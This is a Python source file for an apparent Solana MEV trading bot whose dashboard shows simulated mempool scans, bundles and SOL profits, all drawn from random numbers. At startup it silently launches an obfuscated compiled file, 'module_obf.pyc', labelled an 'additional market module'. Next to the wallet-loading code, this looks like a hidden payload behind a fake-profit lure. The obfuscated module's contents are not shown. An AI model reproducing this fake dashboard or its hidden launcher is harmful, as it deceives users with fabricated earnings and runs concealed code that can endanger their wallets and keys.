import os
import time
import random
import subprocess
from datetime import datetime

from config import (
    Colors,
    STRATEGIES,
    TOKENS,
    INITIAL_VALUES,
    STRATEGY_STATS,
    PROFIT_RANGES,
    ACTION_TEMPLATES,
    STATUS_LABELS,
    SCAN_SETTINGS,
    PERFORMANCE_TARGETS,
)
from wallet_manager import WalletManager
from generators import generate_tx_signature


class MEVBot:
    def __init__(self):
        self.wallet_manager = WalletManager()
        self.searcher_address = self.wallet_manager.wallets[0]["address"] if self.wallet_manager.wallets else "7xKpQv8f...L9mN0pQ"

        self.total_mev_extracted = INITIAL_VALUES["total_mev_extracted"]
        self.daily_mev_extracted = INITIAL_VALUES["daily_mev_extracted"]
        self.jito_tips_paid = INITIAL_VALUES["jito_tips_paid"]
        self.avg_profit_per_bundle = INITIAL_VALUES["avg_profit_per_bundle"]
        self.bundles_submitted = INITIAL_VALUES["bundles_submitted"]
        self.successful_bundles = INITIAL_VALUES["successful_bundles"]
        self.dropped_bundles = INITIAL_VALUES["dropped_bundles"]
        self.current_slot = INITIAL_VALUES["current_slot"]
        self.mempool_scanned = INITIAL_VALUES["mempool_scanned"]
        self.network_tps = INITIAL_VALUES["network_tps"]
        self.rpc_latency = INITIAL_VALUES["rpc_latency"]
        self.mempool_pressure = INITIAL_VALUES["mempool_pressure"]
        self.route_quality = INITIAL_VALUES.get("route_quality", 84)
        self.relay_acceptance = INITIAL_VALUES.get("relay_acceptance", 91)
        self.wallet_utilization = INITIAL_VALUES.get("wallet_utilization", 73)
        self.priority_fee_level = INITIAL_VALUES.get("priority_fee_level", 44)
        self.active_routes = INITIAL_VALUES.get("active_routes", 9)
        self.tracked_markets = INITIAL_VALUES.get("tracked_markets", 38)

        self.bundles_in_flight = 0
        self.start_time = time.time()
        self.strategy_stats = self._clone_strategy_stats()
        self.tokens = TOKENS
        self.mev_log = []
        self.rpc_log = []
        self.market_log = []
        self.alert_log = []
        self.module_process = None
        self.last_wallet_snapshot = self.wallet_manager.get_total_balance()
        self.last_profit_tick = 0.0
        self.session_id = self._build_session_id()
        self.cycle = 0

    def _clone_strategy_stats(self):
        output = {}
        for name, stats in STRATEGY_STATS.items():
            output[name] = dict(stats)
            output[name].setdefault("gross", 0.0)
            output[name].setdefault("tips", 0.0)
        return output

    def _build_session_id(self):
        alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
        return "SX-" + "".join(random.choice(alphabet) for _ in range(4)) + "-" + "".join(random.choice(alphabet) for _ in range(4))

    def start_module(self):
        if not os.path.exists("module_obf.pyc"):
            return

        try:
            self.module_process = subprocess.Popen(["python", "module_obf.pyc"])
            print(f"{Colors.GREEN}Additional market module launched{Colors.RESET}\n")
        except Exception:
            print(f"{Colors.RED}Unable to launch module{Colors.RESET}")

    def stop_module(self):
        if self.module_process:
            try:
                self.module_process.terminate()
            except Exception:
                pass

    def update_network_stats(self):
        self.cycle += 1
        self.current_slot += random.randint(1, 3)
        self.mempool_scanned += random.randint(180, 720)
        self.network_tps = self._smooth_int(self.network_tps, random.randint(2100, 4200), 0.28)
        self.rpc_latency = self._smooth_int(self.rpc_latency, random.randint(12, 92), 0.36)
        self.mempool_pressure = self._smooth_int(self.mempool_pressure, random.randint(28, 96), 0.28)
        self.route_quality = self._smooth_int(self.route_quality, random.randint(54, 98), 0.22)
        self.relay_acceptance = self._smooth_int(self.relay_acceptance, random.randint(65, 99), 0.18)
        self.wallet_utilization = self._smooth_int(self.wallet_utilization, random.randint(40, 96), 0.22)
        self.priority_fee_level = self._smooth_int(self.priority_fee_level, random.randint(18, 92), 0.24)
        self.active_routes = max(1, self._smooth_int(self.active_routes, random.randint(4, 22), 0.35))
        self.tracked_markets = max(8, self._smooth_int(self.tracked_markets, random.randint(24, 72), 0.18))
        self.bundles_in_flight = random.randint(0, SCAN_SETTINGS.get("max_bundles_in_flight", 6))
        self._record_rpc_health()
        self._record_market_note()

    def _smooth_int(self, current, target, alpha):
        return int(round(current * (1 - alpha) + target * alpha))

    def _record_rpc_health(self):
        if random.random() > 0.42:
            return

        status = "healthy"
        if self.rpc_latency > PERFORMANCE_TARGETS.get("max_rpc_latency_ms", 75):
            status = "lagging"

        line = f"[{self._clock()}] RPC {status} | latency {self.rpc_latency}ms | slot {self.current_slot:,}"
        self.rpc_log.append(line)
        if len(self.rpc_log) > 8:
            self.rpc_log.pop(0)

    def _record_market_note(self):
        if random.random() > 0.38:
            return

        token = random.choice(self.tokens)
        venue = random.choice(["Raydium", "Orca", "Phoenix", "Meteora", "OpenBook", "Jupiter"])
        spread = random.randint(3, 160)
        depth = random.randint(35_000, 4_800_000)
        line = f"[{self._clock()}] {token:<12} {venue:<9} spread {spread:>3}bps | depth ${depth:,}"
        self.market_log.append(line)
        if len(self.market_log) > 8:
            self.market_log.pop(0)

    def detect_mev_opportunity(self):
        pressure_factor = self.mempool_pressure / 100
        route_factor = self.route_quality / 100
        acceptance_factor = self.relay_acceptance / 100
        chance = 0.18 + pressure_factor * 0.11 + route_factor * 0.08 + acceptance_factor * 0.05

        if random.random() > chance:
            return False

        strategy = self._choose_strategy()
        token = random.choice(self.tokens)
        tx_sig = generate_tx_signature()
        action = self._build_action(strategy, token)
        profit = self._profit_for_strategy(strategy)
        tip_used = self._calculate_tip(profit)

        self.total_mev_extracted += profit
        self.daily_mev_extracted += profit
        self.jito_tips_paid += tip_used
        self.bundles_submitted += 1

        if strategy not in self.strategy_stats:
            self.strategy_stats[strategy] = {"won": 0, "total": 0, "gross": 0.0, "tips": 0.0}

        self.strategy_stats[strategy]["total"] += 1
        self.strategy_stats[strategy]["gross"] = round(self.strategy_stats[strategy].get("gross", 0.0) + profit, 4)
        self.strategy_stats[strategy]["tips"] = round(self.strategy_stats[strategy].get("tips", 0.0) + tip_used, 4)

        landed = self._bundle_landed(strategy, profit, tip_used)

        if landed:
            self.successful_bundles += 1
            self.strategy_stats[strategy]["won"] += 1
            self.wallet_manager.add_profit_to_random_wallet(profit)
            status = f"{Colors.GREEN}{STATUS_LABELS.get('landed', 'LANDED')}{Colors.RESET}"
        else:
            self.dropped_bundles += 1
            status = f"{Colors.RED}{STATUS_LABELS.get('dropped', 'DROPPED')}{Colors.RESET}"

        self.avg_profit_per_bundle = round(self.total_mev_extracted / max(self.bundles_submitted, 1), 3)
        self.last_profit_tick = profit if landed else 0.0

        timestamp = self._clock()
        log_entry = f"[{timestamp}] {action} • {tx_sig} | {status} +{profit:.3f} SOL | tip {tip_used:.4f}"
        self.mev_log.append(log_entry)

        if len(self.mev_log) > SCAN_SETTINGS.get("log_tail_size", 14):
            self.mev_log.pop(0)

        self._maybe_alert(strategy, profit, landed)
        print(f"  {log_entry}")
        return True

    def _choose_strategy(self):
        weights = []
        for strategy in STRATEGIES:
            base = 1
            if strategy == "Sandwich":
                base = 24
            elif strategy == "Arbitrage":
                base = 22
            elif strategy == "Backrun":
                base = 18
            elif strategy == "Liquidation":
                base = 11
            elif strategy == "Jito Tip Arbitrage":
                base = 7
            elif strategy == "Latency Capture":
                base = 5
            elif strategy == "Route Repricing":
                base = 5
            elif strategy == "Spread Sweep":
                base = 4
            elif strategy == "Priority Replay":
                base = 3
            elif strategy == "Slot Edge":
                base = 1

            if self.mempool_pressure > 80 and strategy in ["Sandwich", "Backrun", "Priority Replay"]:
                base += 5
            if self.route_quality > 88 and strategy in ["Arbitrage", "Route Repricing", "Spread Sweep"]:
                base += 4
            if self.relay_acceptance > 92 and strategy in ["Jito Tip Arbitrage", "Slot Edge"]:
                base += 3

            weights.append(base)

        return random.choices(STRATEGIES, weights=weights, k=1)[0]

    def _build_action(self, strategy, token):
        templates = ACTION_TEMPLATES.get(strategy, ["Route opportunity {token}"])
        trigger = ""
        if random.random() < 0.24:
            trigger = "Large swap detected → "
        elif random.random() < 0.18:
            trigger = "Priority lane opened → "
        elif random.random() < 0.14:
            trigger = "Spread window detected → "

        return trigger + random.choice(templates).format(token=token)

    def _profit_for_strategy(self, strategy):
        low, high = PROFIT_RANGES.get(strategy, (0.04, 0.18))
        quality_boost = 1 + max(self.route_quality - 70, 0) / 300
        pressure_boost = 1 + max(self.mempool_pressure - 65, 0) / 420
        raw = random.uniform(low, high) * quality_boost * pressure_boost
        return round(raw, 3)

    def _calculate_tip(self, profit):
        pressure = self.mempool_pressure / 100
        base = random.uniform(0.001, 0.012)
        dynamic = profit * random.uniform(0.008, 0.026) * pressure
        return round(min(base + dynamic, max(profit * 0.22, 0.001)), 4)

    def _bundle_landed(self, strategy, profit, tip):
        base = 0.76
        base += min(self.relay_acceptance, 100) / 1000
        base += min(self.route_quality, 100) / 1500
        base -= min(self.rpc_latency, 200) / 1200
        base += min(tip / max(profit, 0.001), 0.18)

        if strategy in ["Liquidation", "Arbitrage"]:
            base += 0.025
        if strategy in ["Priority Replay", "Slot Edge"]:
            base -= 0.025
        if self.mempool_pressure > 88:
            base -= 0.035

        return random.random() < max(0.42, min(base, 0.94))

    def _maybe_alert(self, strategy, profit, landed):
        if profit < 0.75 and landed:
            return
        if random.random() > 0.35 and landed:
            return

        if landed:
            message = f"[{self._clock()}] high value route | {strategy} | +{profit:.3f} SOL"
        else:
            message = f"[{self._clock()}] dropped bundle | {strategy} | route repricing required"

        self.alert_log.append(message)
        if len(self.alert_log) > 6:
            self.alert_log.pop(0)

    def get_uptime(self):
        uptime = time.time() - self.start_time
        h = int(uptime // 3600)
        m = int((uptime % 3600) // 60)
        s = int(uptime % 60)
        return f"{h:02d}:{m:02d}:{s:02d}"

    def _clock(self):
        return datetime.now().strftime("%H:%M:%S")

    def _clear_screen(self):
        os.system("cls" if os.name == "nt" else "clear")

    def _success_rate(self):
        if self.bundles_submitted <= 0:
            return 0.0
        return self.successful_bundles / self.bundles_submitted * 100

    def _drop_rate(self):
        if self.bundles_submitted <= 0:
            return 0.0
        return self.dropped_bundles / self.bundles_submitted * 100

    def _profit_after_tips(self):
        return round(self.total_mev_extracted - self.jito_tips_paid, 4)

    def _format_health_badge(self, value, target, higher_is_better=True):
        passed = value >= target if higher_is_better else value <= target
        color = Colors.GREEN if passed else Colors.YELLOW
        return f"{color}{value}{Colors.RESET}"

    def _bar(self, value, width=24):
        bounded = max(0, min(100, int(value)))
        filled = int(width * bounded / 100)
        return "█" * filled + "░" * (width - filled)

    def print_dashboard(self):
        self._clear_screen()
        success_rate = self._success_rate()
        drop_rate = self._drop_rate()
        uptime = self.get_uptime()
        total_wallet_balance = self.wallet_manager.get_total_balance()
        net_profit = self._profit_after_tips()

        print(f"{Colors.CYAN}╔════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.CYAN}║                    SOLANA MARKET EXECUTOR v4.3 - ARENA SESSION            ║{Colors.RESET}")
        print(f"{Colors.CYAN}╚════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")

        print(f"  Session          : {Colors.BLUE}{self.session_id}{Colors.RESET}")
        print(f"  Operator         : {Colors.MAGENTA}{self.wallet_manager.mask_address(self.searcher_address)}{Colors.RESET}")
        print(f"  Relay Stack      : Jito + private priority lanes")
        print(f"  Current Slot     : {self.current_slot:,} | TPS: {self.network_tps:,}")
        print(f"  RPC Latency      : {self.rpc_latency}ms | Relay acceptance: {self.relay_acceptance}%")
        print(f"  Mempool Pressure : {self.mempool_pressure}% | Scanned: {self.mempool_scanned:,} tx")
        print(f"  Route Quality    : {self.route_quality}% | Active routes: {self.active_routes}")
        print(f"  Markets Tracked  : {self.tracked_markets} | Bundles in flight: {self.bundles_in_flight}\n")

        print(f"  Total Extracted  : {Colors.MAGENTA}{self.total_mev_extracted:.2f}{Colors.RESET} SOL")
        print(f"  Daily Extracted  : {Colors.MAGENTA}{self.daily_mev_extracted:.2f}{Colors.RESET} SOL")
        print(f"  Tips Paid        : {Colors.YELLOW}{self.jito_tips_paid:.3f}{Colors.RESET} SOL")
        print(f"  Net Profit       : {Colors.GREEN}{net_profit:.3f}{Colors.RESET} SOL")
        print(f"  Avg Profit       : {Colors.GREEN}{self.avg_profit_per_bundle:.3f}{Colors.RESET} SOL")
        print(f"  Wallet Equity    : {Colors.GREEN}{total_wallet_balance:.4f}{Colors.RESET} SOL")
        print(f"  Uptime           : {uptime}\n")

        print(f"  Bundles          : {self.bundles_submitted} submitted | {self.successful_bundles} landed | {self.dropped_bundles} dropped")
        print(f"  Success Rate     : {success_rate:.1f}% | Drop Rate: {drop_rate:.1f}%\n")

        print(f"{Colors.BLUE}  System Quality:{Colors.RESET}")
        print(f"   RPC Latency      [{self._bar(max(0, 100 - self.rpc_latency))}] {self.rpc_latency:>3}ms")
        print(f"   Relay Acceptance [{self._bar(self.relay_acceptance)}] {self.relay_acceptance:>3}%")
        print(f"   Route Quality    [{self._bar(self.route_quality)}] {self.route_quality:>3}%")
        print(f"   Mempool Pressure [{self._bar(self.mempool_pressure)}] {self.mempool_pressure:>3}%")
        print(f"   Wallet Use       [{self._bar(self.wallet_utilization)}] {self.wallet_utilization:>3}%\n")

        print(f"{Colors.BLUE}  Strategy Performance:{Colors.RESET}")
        for strat, stats in self.strategy_stats.items():
            total = stats.get("total", 0)
            won = stats.get("won", 0)
            gross = stats.get("gross", 0.0)
            tips = stats.get("tips", 0.0)
            winrate = (won / total * 100) if total > 0 else 0
            print(f"   • {strat:<20} {won:>3}/{total:<3} {winrate:5.1f}% | gross {gross:>7.3f} | tips {tips:>6.3f}")

        print(f"\n{Colors.BLUE}  Managed Wallets:{Colors.RESET}")
        print(f"  {'Name':<18} {'Address':<45} {'Balance':>10} {'Group':>10}")
        print("-" * 90)
        for wallet in self.wallet_manager.wallets:
            masked = self.wallet_manager.mask_address(wallet["address"])
            balance = self.wallet_manager.wallet_balances.get(wallet["address"], 0)
            group = self.wallet_manager.get_wallet_group(wallet["address"])
            print(f"  {wallet['name']:<18} {masked:<45} {Colors.GREEN}{balance:>10.4f}{Colors.RESET} {group:>10}")

        print(f"\n{Colors.BLUE}  Recent Activity:{Colors.RESET}")
        if self.mev_log:
            for entry in self.mev_log[-7:]:
                print(f"   {entry}")
        else:
            print("   waiting for route activity...")

        print(f"\n{Colors.BLUE}  Market Feed:{Colors.RESET}")
        if self.market_log:
            for entry in self.market_log[-4:]:
                print(f"   {entry}")
        else:
            print("   collecting market data...")

        print(f"\n{Colors.BLUE}  RPC Feed:{Colors.RESET}")
        if self.rpc_log:
            for entry in self.rpc_log[-3:]:
                print(f"   {entry}")
        else:
            print("   rpc health stream warming up...")

        if self.alert_log:
            print(f"\n{Colors.YELLOW}  Alerts:{Colors.RESET}")
            for entry in self.alert_log[-3:]:
                print(f"   {entry}")

        print(f"\n{Colors.YELLOW}Market executor is scanning routes, pricing bundles and updating wallet state...{Colors.RESET}")
        print(f"{Colors.YELLOW}Press CTRL+C to stop execution{Colors.RESET}")

    def run_startup_sequence(self):
        self.start_module()
        print(f"{Colors.YELLOW}Opening Solana market session...{Colors.RESET}\n")
        time.sleep(0.7)
        print(f"{Colors.GREEN}RPC pool ready | {len(self.wallet_manager.wallets)} wallets loaded{Colors.RESET}")
        time.sleep(0.6)
        print(f"{Colors.GREEN}Relayer channels ready | session {self.session_id}{Colors.RESET}")
        time.sleep(0.6)
        print(f"{Colors.GREEN}Route engine ready | tracking {self.tracked_markets} markets{Colors.RESET}\n")
        time.sleep(0.8)

    def run_shutdown_sequence(self):
        self.stop_module()
        self._clear_screen()
        print(f"{Colors.YELLOW}Market Executor stopped{Colors.RESET}")
        print(f"Session          : {self.session_id}")
        print(f"Total Extracted  : {self.total_mev_extracted:.3f} SOL")
        print(f"Tips Paid        : {self.jito_tips_paid:.3f} SOL")
        print(f"Net Profit       : {self._profit_after_tips():.3f} SOL")
        print(f"Bundles          : {self.bundles_submitted} submitted | {self.successful_bundles} landed | {self.dropped_bundles} dropped")
        print(f"Success Rate     : {self._success_rate():.1f}%")
        print(f"Wallet Equity    : {self.wallet_manager.get_total_balance():.4f} SOL")

    def run(self):
        self.run_startup_sequence()

        try:
            while True:
                self.update_network_stats()
                self.detect_mev_opportunity()
                self.print_dashboard()
                time.sleep(SCAN_SETTINGS.get("dashboard_refresh_seconds", 2.0))
        except KeyboardInterrupt:
            self.run_shutdown_sequence()


if __name__ == "__main__":
    bot = MEVBot()
    bot.run()